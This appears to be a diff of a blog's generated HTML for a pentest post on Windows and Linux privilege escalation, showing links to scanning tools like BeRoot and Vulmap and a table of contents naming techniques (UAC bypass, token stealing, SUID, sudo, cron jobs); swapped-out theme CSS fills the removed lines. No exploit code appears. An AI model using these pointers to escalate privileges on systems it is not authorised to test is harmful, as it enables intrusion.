+<p>Besides there are <a class="link"   target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot" >BeRoot<i class="fas fa-external-link-alt"></i></a> to find config errors, <a class="link"   target="_blank" rel="noopener" href="https://github.com/vulmon/Vulmap" >Vulmap<i class="fas fa-external-link-alt"></i></a> and <a class="link"   target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan" >WindowsVulnScan<i class="fas fa-external-link-alt"></i></a> to scan vulns.</p>
+<p>Online searching includes (in Chinese):</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://detect.secwx.com/" >https://detect.secwx.com/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan/" >http://bugs.hacking8.com/tiquan/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/" >https://i.hacking8.com/tiquan/<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
 
+        </div>
 
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
+        
 
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/windows/">#windows</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/pentest/">#pentest</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
-        .name {
-          color: var(--default-text-color);
-        }
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/04/20/2021-04-20-Linux-Kernel-Building-Exploit-Preparation/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Linux Kernel Building &amp; Exploit Preparation</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/02/18/2021-02-18-About-Pentest-Persistence/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">About Pentest Persistence</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
 
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-
-  .post-tags-box {
-    display: none;
-    margin-top: 1.6rem;
-    justify-content: center;
-    font-size: 1.1rem;
-
-    +keep-tablet() {
-      display: flex;
-    }
-
-    +keep-mobile() {
-      margin-top: 1.2rem;
-      font-size: 1rem;
-    }
-
-
-    .tag-item {
-      margin: 0 0.25rem;
-    }
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-
-    +keep-tablet() {
-      margin-top: $component-spacing-value * 0.8;
-    }
-  }
-
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+        
+    </div>
+</div>
 
 
                 
@@ -475,80 +553,11 @@ $article-title-font-size = 1.6rem;
 
     
         <aside class="page-aside">
-            .post-toc-wrap {
-  width: 100%;
-  font-size: 0.92rem;
-  box-sizing: border-box;
-
-  .post-toc {
-
-    ol {
-      list-style: none;
-      margin: 0;
-      padding: 0 2px 12px 10px;
-      text-align: left;
-
-      &:last-child {
-        padding-bottom: 0;
-      }
-
-      > ol {
-        padding-left: 0;
-      }
-
-      a {
-        transition-property: all;
-        transition();
-      }
-    }
-
-
-    .nav-item {
-      line-height: 1.8;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-
-    .nav {
-      .nav-child {
-        display: hexo-config('toc.expand_all') ? block : none;
-      }
-
-      .active > .nav-child {
-        display: block;
-      }
-
-      .active-current > .nav-child {
-        display: block;
-
-        > .nav-item {
-          display: block;
-        }
-      }
-
-
-      .nav-number, .nav-text {
-        color: var(--default-text-color);
-      }
-
-      .active > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-
-      .active-current > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-    }
-  }
-}
-
-
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel-Exploit"><span class="nav-number">1.1.</span> <span class="nav-text">Kernel Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Config-Error"><span class="nav-number">1.2.</span> <span class="nav-text">Config Error</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GPP-Privilege-Escalation"><span class="nav-number">1.3.</span> <span class="nav-text">GPP Privilege Escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-UAC"><span class="nav-number">1.4.</span> <span class="nav-text">Bypass UAC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token-Stealing"><span class="nav-number">1.5.</span> <span class="nav-text">Token Stealing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Without-Token"><span class="nav-number">1.6.</span> <span class="nav-text">Without Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#For-Different-OS-Version"><span class="nav-number">1.7.</span> <span class="nav-text">For Different OS Version</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other-Methods"><span class="nav-number">1.8.</span> <span class="nav-text">Other Methods</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel-Exploit-1"><span class="nav-number">2.1.</span> <span class="nav-text">Kernel Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID"><span class="nav-number">2.2.</span> <span class="nav-text">SUID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUDO"><span class="nav-number">2.3.</span> <span class="nav-text">SUDO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cronjob"><span class="nav-number">2.4.</span> <span class="nav-text">Cronjob</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#in-PATH"><span class="nav-number">2.5.</span> <span class="nav-text">. in $PATH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other-Techniques"><span class="nav-number">2.6.</span> <span class="nav-text">Other Techniques</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Useful-Tools"><span class="nav-number">3.</span> <span class="nav-text">Other Useful Tools</span></a></li></ol>
+    </div>
+</div>
         </aside>
     
 
